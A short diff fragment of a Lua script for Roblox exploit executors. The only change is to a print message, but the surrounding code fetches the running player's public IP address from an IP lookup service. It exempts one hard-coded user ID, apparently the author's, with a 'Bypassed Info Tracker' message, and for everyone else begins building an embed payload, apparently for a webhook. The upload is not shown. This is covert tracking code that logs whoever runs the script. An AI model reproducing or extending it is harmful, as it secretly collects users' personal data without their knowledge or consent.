@@ -3,7 +3,7 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
 local HttpService = game:GetService("HttpService")
 local Ip = tostring(game:HttpGet("https://api.ipify.org", true))
 if game.Players.LocalPlayer.UserId == 860289947 then
-print("Bypasses Info Tracker")
+print("Bypassed Info Tracker")
 else
 local Data = {
     ["embeds"] = {
